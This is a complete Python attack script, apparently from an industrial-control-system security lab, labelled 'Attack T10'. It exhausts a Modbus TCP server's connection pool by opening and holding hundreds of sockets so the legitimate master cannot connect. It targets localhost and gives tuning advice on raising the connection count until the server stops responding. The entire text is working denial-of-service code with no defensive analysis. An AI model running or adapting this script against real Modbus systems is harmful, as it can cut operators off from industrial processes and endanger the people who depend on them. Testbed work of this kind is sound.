# This script implements the Modbus TCP Pool Exhaustion attack by opening 
# many legitimate connections without closing them, exhausting the server's
# capacity, preventing the legitimate Master to get in.
import socket
import time
import threading

TARGET_IP = 'localhost'
TARGET_PORT = 5020
CONNECTION_COUNT = 500 # this number can be adjusted until the server stops responding

sockets = []

def attack():
    print(f"--- Starting TCP Pool Exhaustion (Attack T10) ---")
    for i in range(CONNECTION_COUNT):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET_IP, TARGET_PORT))
            sockets.append(s)
            print(f"Connection {i} started and kept open...")
        except Exception as e:
            print(f"The server stopped accepting new connections at the {i} trial!")
            break
    
    print("--- All legitimate connections are open. The legitimate Master should fail now. ---")
    # keeping the script running in order to keep the connections on
    time.sleep(60) 

if __name__ == "__main__":
    attack()